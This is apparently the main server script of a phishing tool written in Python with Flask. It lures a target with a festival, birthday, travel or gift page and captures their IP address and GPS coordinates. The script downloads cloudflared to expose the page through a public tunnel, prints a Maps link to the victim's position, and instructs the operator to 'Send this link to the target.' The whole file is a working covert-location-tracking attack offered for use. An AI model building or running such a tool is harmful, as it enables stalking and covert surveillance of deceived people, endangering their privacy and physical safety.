from flask import Flask, render_template, request, send_from_directory
from werkzeug.serving import make_server
import os ,sys, logging,threading,time,hoster
import splashscreen
import urllib.request
import shutil

pycache_dir = os.path.join(os.getcwd(), '__pycache__')
if os.path.exists(pycache_dir):
    shutil.rmtree(pycache_dir)

GREEN = "\033[92m"
RESET = "\033[0m"
RED = "\033[31m"
YELLOW = "\033[93m"
BLUE = "\033[34m"
LIGHT_BLUE = "\033[94m"
LIGHT_RED = "\033[91m"

splashscreen.showit()
public_url = None
logging.basicConfig(level=logging.INFO)
filename = "cloudflared.exe"
download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"

app = Flask(__name__)

# Global storage
selected_template = ""
user_location = {"lat": None, "lon": None}
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

def ask_template():
    global selected_template
    templates = ["festival", "birthday", "travel", "gift"]
    print(BLUE + "[" + YELLOW + "*" + BLUE + "]"+ YELLOW + "Choose a template to show after location access:" + RESET)
    for i, t in enumerate(templates):
        print(f"{LIGHT_BLUE}{i + 1}. {t}{RESET}")
    choice = int(input(YELLOW+"Enter choice: "+RESET))
    selected_template = templates[choice - 1]
    print(GREEN + f"Template '{selected_template}' selected." + RESET)
    print()

@app.route('/')
def home():
    user_ip = request.remote_addr
    print(LIGHT_BLUE+"User visited!")
    print(f"IP: {user_ip}")
    print()
    # Serve your index.html from the current directory (or adjust as needed)
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    global user_location
    data = request.get_json()
    user_location['lat'] = data.get('lat')
    user_location['lon'] = data.get('lon')
    print(f"User location received: {user_location}")
    print()
    print(LIGHT_RED+f"Google map link: https://maps.google.com/?q={user_location['lat']},{user_location['lon']}")
    # Redirect to /show/<template>
    return {"redirect_url": f"/show/{selected_template}"}

@app.route('/location-denied', methods=['POST'])
def location_denied():
    print("❌ Location access denied by user.")
    os._exit(0)

@app.route('/show/<template>')
def show_template(template):
    # Pass festival_name (capitalized for display)
    return render_template(f"{template}.html",)

def start_tunnel_in_background():
    if not os.path.isfile(filename):
        print(GREEN+f"Installing.. {filename}"+RESET)
        try:
            urllib.request.urlretrieve(download_url, filename)
        except Exception as e:
            print(f"Error downloading {filename}: {e}")
    else:
        print(f"{filename} already exists.")
    global public_url
    public_url = hoster.start_tunnel()

if __name__ == '__main__':
    ask_template()
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    print()
    threading.Thread(target=start_tunnel_in_background, daemon=True).start()
    print(BLUE + "[" + YELLOW + "*" + BLUE + "]"+ YELLOW + "Creating Tunnel.." + RESET)
    while public_url is None:
        time.sleep(1)
    print()
    print(BLUE + "[" + YELLOW + "*" + BLUE + "]"+ YELLOW + "Tunnel created" + RESET)
    print(LIGHT_RED+"Send this link to the target:  "+public_url + RESET)
    server = make_server('127.0.0.1', 5000, app)
    server.serve_forever()
    
